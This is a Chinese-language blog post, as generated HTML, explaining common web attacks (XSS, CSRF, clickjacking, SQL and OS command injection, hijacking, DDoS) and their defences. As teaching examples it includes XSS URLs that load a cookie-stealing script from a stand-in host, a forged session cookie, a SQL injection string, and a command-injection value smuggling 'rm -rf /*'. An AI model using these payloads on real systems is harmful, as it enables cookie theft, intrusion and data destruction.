@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>常见web攻击 | RICHARD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSSCross Site Script跨站脚本攻击。跨站脚本攻击是指通过存在安全漏洞的web网站，在用户的浏览器内运行非法的非本站点的javaScript脚本而进行的一种攻击。 跨站脚本攻击可能的影响：  利用虚假输入表单骗取用户个人信息 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。 显示伪造的文章或图片。  xss攻击分类基于DOM的XSS攻击一般来说，h">
+<meta name="keywords" content="Python, JS, Vue, NodeJS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见web攻击">
+<meta property="og:url" content="http://yoursite.com/2020/07/30/常见web攻击/index.html">
+<meta property="og:site_name" content="RICHARD">
+<meta property="og:description" content="XSSCross Site Script跨站脚本攻击。跨站脚本攻击是指通过存在安全漏洞的web网站，在用户的浏览器内运行非法的非本站点的javaScript脚本而进行的一种攻击。 跨站脚本攻击可能的影响：  利用虚假输入表单骗取用户个人信息 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。 显示伪造的文章或图片。  xss攻击分类基于DOM的XSS攻击一般来说，h">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-08-31T13:01:58.246Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见web攻击">
+<meta name="twitter:description" content="XSSCross Site Script跨站脚本攻击。跨站脚本攻击是指通过存在安全漏洞的web网站，在用户的浏览器内运行非法的非本站点的javaScript脚本而进行的一种攻击。 跨站脚本攻击可能的影响：  利用虚假输入表单骗取用户个人信息 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。 显示伪造的文章或图片。  xss攻击分类基于DOM的XSS攻击一般来说，h">
+  
+    <link rel="alternate" href="/atom.xml" title="RICHARD" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">RICHARD</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">RICHARD BLOG</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-常见web攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/30/常见web攻击/" class="article-date">
+  <time datetime="2020-07-30T11:28:48.000Z" itemprop="datePublished">2020-07-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      常见web攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>Cross Site Script跨站脚本攻击。跨站脚本攻击是指通过存在安全漏洞的web网站，在用户的浏览器内运行非法的非本站点的javaScript脚本而进行的一种攻击。</p>
+<p>跨站脚本攻击可能的影响：</p>
+<ol>
+<li>利用虚假输入表单骗取用户个人信息</li>
+<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
+<li>显示伪造的文章或图片。</li>
+</ol>
+<h2 id="xss攻击分类"><a href="#xss攻击分类" class="headerlink" title="xss攻击分类"></a>xss攻击分类</h2><h3 id="基于DOM的XSS攻击"><a href="#基于DOM的XSS攻击" class="headerlink" title="基于DOM的XSS攻击"></a>基于DOM的XSS攻击</h3><p>一般来说，hacker不能劫持正常的网络传输，但如果有内鬼通过中间人代理劫持HTML传输，就可以修改html文件在其中任意穿插恶意脚本，再发送给用户。一般来说，这种情况出现在运营商中间。</p>
+<h3 id="存储型XSS攻击"><a href="#存储型XSS攻击" class="headerlink" title="存储型XSS攻击"></a>存储型XSS攻击</h3><p>步骤：</p>
+<ol>
+<li>首先hacker利用站点漏洞将一段恶意javaScript代码提交到网站的数据库中。</li>
+<li>然后用户向网站请求包含了恶意javaScript脚本的页面。</li>
+<li>当用户浏览该页面的时候，恶意脚本就会将用户的cookie信息等数据上传到hacker服务器。</li>
+</ol>
+<h3 id="反射型-url参数直接注入"><a href="#反射型-url参数直接注入" class="headerlink" title="反射型-url参数直接注入"></a>反射型-url参数直接注入</h3><p>hacker找到有漏洞的接口，用户给服务器发送的一些参数后，服务器没有经过处理，直接原样返回了部分参数。<br>就给黑客可趁之机，把恶意js脚本当参数发给服务器，服务器直接返回了这个脚本字符串，在浏览器DOM解析器中就能顺利引入这个恶意脚本达成hack。</p>
+<p>反射型XSS和存储型XSS最大的区别就是，反射型不会在服务器存储脚本，需要诱骗用户主动点击包含漏洞的url。存储型主要在于上传恶意脚本到服务器，后面只需要等待用户点击网页。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通</span></span><br><span class="line">http://localhost:3000/?from=china</span><br><span class="line"></span><br><span class="line"><span class="comment">#  alert 尝试</span></span><br><span class="line">http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  获取Cookie</span></span><br><span class="line">http://localhost:3000/?from=&lt;script src=<span class="string">"http://localhost:4000/hack.js"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 短域名伪造https://dwz.cn/</span></span><br><span class="line"><span class="comment">#  伪造cookie入侵 chrome</span></span><br><span class="line">document.cookie=<span class="string">"kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="xss-攻击的危害"><a href="#xss-攻击的危害" class="headerlink" title="xss 攻击的危害"></a>xss 攻击的危害</h2><p>简单来说Script脚本能干啥就能干啥。</p>
+<ol>
+<li>获取页面的数据</li>
+<li>获取Cookie</li>
+<li>劫持前端逻辑</li>
+<li>发送请求</li>
+<li>偷取网站的任意数据</li>
+<li>偷取用户的资料</li>
+<li>偷取用户的秘密和登录态</li>
+<li>欺骗用户<h2 id="xss-防范手段"><a href="#xss-防范手段" class="headerlink" title="xss 防范手段"></a>xss 防范手段</h2><h3 id="转义字符-amp-ejs转义"><a href="#转义字符-amp-ejs转义" class="headerlink" title="转义字符 &amp; ejs转义"></a>转义字符 &amp; ejs转义</h3>对于用户的输入永远做不可信任处理，最普遍的做法就是转义输入输出的内容，对引号，尖括号，斜杠进行转义。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>) </span><br><span class="line">    str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>) </span><br><span class="line">    str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)  </span><br><span class="line">    str = str.replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quto;'</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>) </span><br><span class="line">    str = str.replace(<span class="regexp">/`/g</span>, <span class="string">'&amp;#96;'</span>)  </span><br><span class="line">    str = str.replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2F;'</span>)  </span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>ejs模板引擎中：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% code %&gt; 用于执行其中javaScript 代码</span><br><span class="line">&lt;%= code %&gt; 会对code进行html转义</span><br><span class="line">&lt;%- code %&gt; 将不会进行转义</span><br></pre></td></tr></table></figure>
+
+<p>对于富文本来说，显然不能通过上面的办法来转义所有的字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用的是白名单过滤的办法。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xss = <span class="built_in">require</span>(<span class="string">'xss'</span>)</span><br><span class="line"><span class="keyword">let</span> html = xss(<span class="string">'&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert("xss");&lt;/script&gt;'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(html) <span class="comment">//  &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert("xss");&amp;lt;/script&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置Header"><a href="#设置Header" class="headerlink" title="设置Header"></a>设置Header</h3><p>禁止xss过滤，因为这个设置本身有很高的安全隐患，当注入相同名字的脚本时，会导致浏览器误判，使原本使用的同名的第三方库也无法使用。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">'x-xss-Protection'</span>, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 禁止XSS过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 启用XSS过滤，浏览器默认启用。如果检测到跨站脚本攻击，浏览器将清除页面(删除不安全的部分)。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1; mode=block 启用xss过滤，如果哦检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1; report=&lt;reporting-URI&gt; 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CSP-Content-Security-Policy"><a href="#CSP-Content-Security-Policy" class="headerlink" title="CSP(Content Security Policy)"></a>CSP(Content Security Policy)</h3><p>CSP,内容安全策略是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。</p>
+<p>CSP本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少XSS攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只允许加载本站资源</span></span><br><span class="line">Content-Security-Policy: default-src <span class="string">'self'</span></span><br><span class="line"><span class="comment"># 只允许加载HTTPS协议图片</span></span><br><span class="line">Content-Security-Policy: img-src https://*</span><br><span class="line"><span class="comment"># 不允许加载任何来源框架</span></span><br><span class="line">Content-Security-Policy: child-src <span class="string">'none'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试一下外部资源不能加载 http://localhost:3000/?from=&lt;script src="http://localhost:4000/hack.js"&gt; &lt;/script&gt;</span></span><br><span class="line">ctx.set(<span class="string">'Content-Security-Policy'</span>, <span class="string">"default-src 'self'"</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h3><p>这是预防XSS攻击窃取用户cookie最有效的防御手段。web应用程序在设置cookie时，将其属性设为HttpOnly后，客户端脚本就不能读取到cookie，从而保护用户cookie信息。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.addHeader(<span class="string">'Set-Cookie'</span>, <span class="string">'uid=112; Path=/; HttpOnly'</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="cookie值进行hash"><a href="#cookie值进行hash" class="headerlink" title="cookie值进行hash"></a>cookie值进行hash</h3><p>攻击者在访问信任网站A时，虽然浏览器可以在请求中带上cookie，但是网站A不仅仅通过cookie来判断用户身份，同时通过用户发送过来的内容中的伪随机数来判断请求真正是用户发送的。攻击者在请求A的时候，不能在提交的内容中产生伪随机数(通过cookie哈希化的值)。</p>
+<h1 id="CSRF-Cross-Site-Request-Forgery"><a href="#CSRF-Cross-Site-Request-Forgery" class="headerlink" title="CSRF(Cross Site Request Forgery)"></a>CSRF(Cross Site Request Forgery)</h1><p>跨站请求伪造,是一种常见的Web攻击，它利用用户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol>
+<li><p>用户已经登录了站点A，并在本地记录了cookie。</p>
+</li>
+<li><p>在用户没有登出站点A的情况下(也就是cookie生效的情况下)，访问了恶意攻击提供的危险站点B(B站点要求访问A站点)。</p>
+</li>
+<li><p>A站点没有做任何CSRF防御。</p>
+<h2 id="CSRF-攻击危害"><a href="#CSRF-攻击危害" class="headerlink" title="CSRF 攻击危害"></a>CSRF 攻击危害</h2></li>
+<li><p>利用用户登录态</p>
+</li>
+<li><p>用户不知情</p>
+</li>
+<li><p>完成业务请求</p>
+</li>
+<li><p>盗取用户资金(转账，消费)</p>
+</li>
+<li><p>冒充用户发帖</p>
+</li>
+<li><p>损害网站声誉</p>
+<h2 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h2></li>
+<li><p>禁止第三方网站带Cookie(有兼容性问题)</p>
+</li>
+<li><p>同源检测(referer check),Https 不发送 referer。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> next()</span><br><span class="line">    <span class="keyword">const</span> referer = ctx.request.header.referer</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Referer:'</span>, referer) </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>验证码</p>
+</li>
+</ol>
+<h1 id="点击劫持-clickjacking"><a href="#点击劫持-clickjacking" class="headerlink" title="点击劫持(clickjacking)"></a>点击劫持(clickjacking)</h1><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过iframe嵌入自己的网页中，并将iframe设置为透明，在页面中透出一个按钮诱导用户点击。</p>
+<h2 id="clickjacking-防御"><a href="#clickjacking-防御" class="headerlink" title="clickjacking 防御"></a>clickjacking 防御</h2><ol>
+<li><p>X-FRAME-OPTIONS<br>X-FRAME-OPTIONS 是一个HTTP响应头，在现代浏览器有一个很好的支持。这个HTTP响应头就是为了防御用iframe嵌套的点击劫持攻击。该响应头有三个值可以选择，分别是DENY，表示页面不允许通过iframe的方式展示；SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示；ALLOW-FROM，表示页面可以在指定来源的iframe中展示。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">'X-FRAME-OPTIONS'</span>, <span class="string">'DENY'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>JS防御方式<br>判断当前页面窗口self和主窗口top是否相同当通过，当iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。 </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">"click-jack"</span>&gt;</span></span><br><span class="line">        html &#123;   </span><br><span class="line">            display: none !important;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (self == top) &#123;  <span class="comment">// 相同，则没有iframe嵌入，移除样式</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">'click-jack'</span>)</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.removeChild(style) </span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 不相同，则有iframe嵌入，则跳转到自己的页面导航地址</span></span></span><br><span class="line">            top.location = self.location  </span><br><span class="line">        &#125; </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 填入特殊密码 </span></span><br><span class="line"><span class="number">1</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line"><span class="comment">// 拼接后的SQL 这样也能从数据库查到</span></span><br><span class="line"> SELECT * FROM test.user WHERE username = <span class="string">'laowang'</span> AND password = <span class="string">'1'</span>or<span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户 输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误写法</span></span><br><span class="line"><span class="keyword">const</span> sql = <span class="string">`SELECT * FROM test.user WHERE username = '<span class="subst">$&#123;ctx.request.body.username&#125;</span>' AND password = '<span class="subst">$&#123;ctx.request.body.password&#125;</span>'`</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'sql'</span>, sql)</span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> query(sql)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"><span class="keyword">const</span> sql = <span class="string">`SELECT * FROM test.user WHERE username = ? AND password = ?`</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'sql'</span>, sql)</span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> query(sql, [ctx.request.body.username, ctx.request.body.password])</span><br></pre></td></tr></table></figure>
+
+<p>严格限制web应用的数据库的操作权限，给此用户提供仅仅能满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。</p>
+<p>后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。</p>
+<p>对进入数据库的特殊字符(‘,”,,&lt;,&gt;,&amp;,*,;等)进行转义处理，或编码转换。基本上所有的后端语言都有对字符串进行转义处理的方法，比如lodash的lodash._escapehtmlchar。</p>
+<h1 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h1><p>OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入攻击指通过web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。如果调用Shell时存在疏漏，就可以职系那个插入的非法命令。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">'mz/child_process'</span>).exec; </span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* 用户输入的参数 */</span>&#125;; </span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果传入的参数如下, 就会出现删除文件夹的危险操作</span></span><br><span class="line"><span class="keyword">const</span> params = <span class="string">'https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;'</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="请求劫持"><a href="#请求劫持" class="headerlink" title="请求劫持"></a>请求劫持</h1><h2 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h2><p>顾名思义，就是DNS服务器解析各个步骤被篡改，修改了域名解析的结果，使得访问到的不是预期的不是预期的IP地址。</p>
+<h2 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h2><p>运营商劫持，只能升级到HTTPS。</p>
+<h1 id="DDOS-distributed-denial-of-service"><a href="#DDOS-distributed-denial-of-service" class="headerlink" title="DDOS (distributed denial of service )"></a>DDOS (distributed denial of service )</h1><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网 站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪 服务的目的。<br>其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承 受量，导致宕机。</p>
+<h2 id="常见的攻击方式"><a href="#常见的攻击方式" class="headerlink" title="常见的攻击方式"></a>常见的攻击方式</h2><h3 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN Flood"></a>SYN Flood</h3><p>此攻击通过向目标发送具有欺骗性源IP地址的大量TCP“初始连接请求”SYN数据包来利用TCP握 手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程 中的目标资源。</p>
+<h3 id="HTTP-Flood"><a href="#HTTP-Flood" class="headerlink" title="HTTP Flood"></a>HTTP Flood</h3><p>此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新 - 大量HTTP请求泛滥服务器， 导致拒绝服务。</p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h3 id="备份网站"><a href="#备份网站" class="headerlink" title="备份网站"></a>备份网站</h3><p>备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网站出现了问题，正在全力抢修。</p>
+<h3 id="HTTP请求的来拦截"><a href="#HTTP请求的来拦截" class="headerlink" title="HTTP请求的来拦截"></a>HTTP请求的来拦截</h3><p>高防IP- 靠谱的运营商 多个Docker<br>硬件： 服务器 防火墙<br>带宽扩容 + cdn<br>提高犯罪成本</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/07/30/常见web攻击/" data-id="ckh44mzuh001k4sv203q6zzfa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/03/项目实战一/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          项目实战一
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/23/webpack/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">webpack</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DOM/">DOM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/How-to-use-hexo-create-a-blog/">How to use hexo create a blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/canvas-基础/">canvas 基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/设计模式/">设计模式</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSS/" style="font-size: 20px;">CSS</a> <a href="/tags/DOM/" style="font-size: 10px;">DOM</a> <a href="/tags/How-to-use-hexo-create-a-blog/" style="font-size: 10px;">How to use hexo create a blog</a> <a href="/tags/canvas-基础/" style="font-size: 10px;">canvas 基础</a> <a href="/tags/设计模式/" style="font-size: 10px;">设计模式</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/09/DOM/">DOM</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/09/CSS总结/">CSS总结</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/09/canvas基础/">canvas</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/09/设计模式/">设计模式</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/09/重识CSS/">重识CSS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Richard.Zhao<br>
